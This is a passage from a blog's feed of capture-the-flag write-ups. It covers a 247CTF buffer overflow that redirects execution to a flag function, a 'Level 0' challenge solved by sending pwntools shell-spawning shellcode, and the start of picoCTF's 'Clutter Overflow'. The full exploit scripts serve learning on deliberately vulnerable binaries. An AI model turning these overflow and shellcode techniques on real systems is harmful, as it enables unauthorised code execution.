style="color:#393A34">.</span><span class="token plain">log_level </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'info'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">context</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">terminal </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">'gnome-terminal'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'-e'</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CYCLIC_BYTES </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1000</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">conn</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:#e3116c">'''Establish the connection to the process, local or remote.</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">    '''</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> args</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">get</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'REMOTE'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        io </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> remote</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'40b14b3351586e58.247ctf.com'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">50175</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">else</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        io </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> process</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">exe</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">path</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> io</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:#e3116c">'''Return the flag.</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">    '''</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    offset </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> get_offset</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    send_payload</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">offset</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">get_offset</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:#e3116c">'''Get the offset'''</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> args</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">get</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'REMOTE'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">76</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">with</span><span class="token plain"> conn</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> io</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        pat </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> cyclic</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">CYCLIC_BYTES</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> n</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">4</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        io</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b"What do you have to say?"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> pat</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># Program will crash and output coredump</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        io</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">wait</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        core </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> io</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">corefile</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        offset_addr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> core</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">fault_addr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        log</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">info</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string-interpolation string" style="color:#e3116c">f"ADDR:</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">offset_addr</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        offset </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> cyclic_find</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">offset_addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> n</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">4</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        log</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">info</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string-interpolation string" style="color:#e3116c">f"OFFSET:</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">offset</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> offset</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">send_payload</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">offset</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:#e3116c">'''Send offset payload with flag function address'''</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">with</span><span class="token plain"> conn</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> io</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        flag_func </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> p32</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">exe</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">symbols</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">'flag'</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> endian</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">'little'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        log</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">info</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string-interpolation string" style="color:#e3116c">f"</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">flag_func</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> fit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            offset</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">flag_func</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        io</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b"What do you have to say?"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        io</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">interactive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> __name__ </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'__main__'</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>First, I wanted to determine where the offset of scanf within the chall function was within the program. With the script above, I sent 1000 bytes using the cyclic pattern and attempted to crash the program. I parse the coredump for the address that caused the executable to crash. The executable will have crashed because chall's return address will have been overwritten. Chall's function stack is 76 bytes, consisting of the 68 byte array, the 4 byte FILE pointer, and the 4 byte stack pointer. The return address will be overwritten to be a subsequence of the pattern I sent with the usage of <code>cyclic</code>. Using <code>cyclic_find</code>, we find that the offset is 76 which matches what was expected.</p><p>Now that I had the offset, I needed to determine the flag function's address. This can be done by looking up the flag symbol with pwnlib.elf.elf. The address obtained is packed in little endian with the offset and sent.</p><p>Sending this payload to the server gets me the flag '247CTF{b1c2cb7d5a43939f8dc73369ec2dd59d}'.</p>]]></content>
        <author>
            <name>Christopher Nguyen</name>
            <uri>https://github.com/christopher-nguyen-re</uri>
        </author>
        <category label="CTF" term="CTF"/>
        <category label="Binary Exploitation" term="Binary Exploitation"/>
        <category label="247ctf" term="247ctf"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Level 0]]></title>
        <id>level-0</id>
        <link href="https://christopher-nguyen-re.github.io/blog/level-0"/>
        <updated>2022-02-07T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[CTF: Level 0]]></summary>
        <content type="html"><![CDATA[<p>CTF: Level 0</p><p><a href="/files/level_0/level-0">Executable used for the challenge</a></p><p>To download the challenge, right click the link and open in a new tab.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="the-challenge">The Challenge<a class="hash-link" href="#the-challenge" title="Direct link to heading">​</a></h2><p>Level 0 provides an amd64 executable where the goal is to get the executable to open a shell.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="analysis">Analysis<a class="hash-link" href="#analysis" title="Direct link to heading">​</a></h2><p>I decided to first use ghidra to have a better understanding of the program. In ghidra, I look for _start() as that as normally the entry point of a program.</p><p><img loading="lazy" alt="_start()" src="/assets/images/level0_start-aec4626c9045295b84a4b20a1b4d544c.png" width="498" height="280" class="img_E7b_"></p><p>_start() calls main so I looked into main next.</p><p><img loading="lazy" alt="main()" src="/assets/images/level0_main-2b3cdd697b90fd9d3460a8df1b569515.png" width="494" height="248" class="img_E7b_"></p><p>I looked into init_chal and found that SIGALRM is sent 30 seconds after running the program. I ran the program and waited to see what would happen. It resulted in an output of 'Alarm clock' to the terminal before exiting the program. I noticed that the stdin and stdout buffers were both set to be unbuffered.</p><p>I went back to the main function and noticed memory is allocated to a buffer through the usage of mmap. Looking into the arguments that are used in mmap, I saw that the prot field contained read, write, and execute for the page. The length of the mapping is 4096 bytes. After memory has been allocated, read is called to read stdin into the buffer up to 4096 bytes. The buffer is called as a function pointer to be executed before returning.</p><p>This makes it clear that I need to send instructions through stdin in order to open a shell.</p><p>I accomplish this with the following code.</p><div class="codeBlockContainer_I0IT language-python theme-code-block"><div class="codeBlockContent_wNvx" style="color:#393A34;background-color:#f6f8fa"><pre tabindex="0" class="prism-code language-python codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> pwn </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exe </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"./level-0"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">context</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">binary </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">context</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">log_level </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'info'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">context</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">terminal </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">'gnome-terminal'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'-e'</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">conn</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:#e3116c">'''Establish the connection to the file</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">    '''</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    io </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> process</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">exe</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">path</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> io</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:#e3116c">'''Pop open a shell</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">    '''</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">with</span><span class="token plain"> conn</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> io</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        shellcode </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> asm</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">shellcraft</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">amd64</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">linux</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sh</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        io</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">shellcode</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        io</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">interactive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> __name__ </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'__main__'</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p><code>shellcraft.amd64.linux.sh()</code> contained the instructions for opening a shell and I used <code>asm()</code> in order to convert assembly into bytes. The shellcode is then sent directly to the program.</p><p>I ran this script and was able to access a shell from within the level-0 program.</p>]]></content>
        <author>
            <name>Christopher Nguyen</name>
            <uri>https://github.com/christopher-nguyen-re</uri>
        </author>
        <category label="CTF" term="CTF"/>
        <category label="Binary Exploitation" term="Binary Exploitation"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Clutter Overflow]]></title>
        <id>clutter_overflow</id>
        <link href="https://christopher-nguyen-re.github.io/blog/clutter_overflow"/>
        <updated>2022-02-03T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Pico CTF: Clutter Overflow]]></summary>
        <content type="html"><![CDATA[<p>Pico CTF: Clutter Overflow</p><p>The challenge can be found <a href="https://play.picoctf.org/practice/challenge/1216" target="_blank" rel="noopener noreferrer">here</a></p><h2 class="anchor anchorWithStickyNavbar_mojV" id="the-challenge">The Challenge<a class="hash-link" href="#the-challenge" title="Direct link to heading">​</a></h2><p>Upon running <code>nc mars.picoctf.net 31890</code>, I get the following output.</p><p><img loading="lazy" alt="Clutter Overflow Startup" src="/assets/images/clutter_overflow_start-4b52c8ab2849c957cd506d6e4f7f631f.png" width="672" height="402" class="img_E7b_"></p><h2 class="anchor anchorWithStickyNavbar_mojV" id="the-solve">The Solve<a class="hash-link" href="#the-solve" title="Direct link to heading">​</a></h2><h3 class="anchor anchorWithStickyNavbar_mojV" id="determining-the-objective">Determining the objective<a class="hash-link" href="#determining-the-objective" title="Direct link to heading">​</a></h3><p>First, I attempt to send the input of 'monkeys' and receive this as output.</p><p><img loading="lazy" alt="Clutter Overflow Initial Output" src="/assets/images/clutter_overflow_ex_output-dbd096fd7531d83cd9f725324e71f27a.png" width="717" height="427" class="img_E7b_"></p><p>I take a look at the source as it is provided and see that the gets command is used to store the user input into the char buffer called 'clutter'. 'clutter' is a fixed size char array of length 100 and is vulnerable to buffer overruns.</p><p><img loading="lazy" alt="Clutter Overflow Source Code" src="/assets/images/clutter_overflow_source-052038429b19cf89abb5e5285b532633.png" width="572" height="509" class="img_E7b_"></p><p>In order to get the flag, I know that I need to overrun the buffer and modify the data stored within 'code' to be equal to 0xdeadbeef.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="reaching-the-objective">Reaching the objective<a class="hash-link" href="#reaching-the-objective" title="Direct link to heading">​</a></h3><p>I use python to create a script that establishes a connection to the challenge with the help of pwntools.</p><div class="codeBlockContainer_I0IT language-python theme-code-block"><div class="codeBlockContent_wNvx" style="color:#393A34;background-color:#f6f8fa"><pre tabindex="0" class="prism-code language-python codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#393A34"><span class="token plain">io </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> remote</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'mars.picoctf.net'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">31890</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>I know that I need to send data that is significantly larger then the size of clutter's size. I use pwntools to create a pattern with length 500 and a unique subsequence of 8 bytes because the variable 'code' is 8 bytes.</p><div class="codeBlockContainer_I0IT language-python theme-code-block"><div class="codeBlockContent_wNvx" style="color:#393A34;background-color:#f6f8fa"><pre tabindex="0" class="prism-code language-python codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#393A34"><span class="token plain">pat </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> cyclic</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">500</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> n</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>I send the pattern to the server and receive up to before 'code' is printed.</p><div class="codeBlockContainer_I0IT language-python theme-code-block"><div class="codeBlockContent_wNvx" style="color:#393A34;background-color:#f6f8fa"><pre tabindex="0" class="prism-code language-python codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#393A34"><span class="token plain">io</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b"What do you see?"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> pat</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path 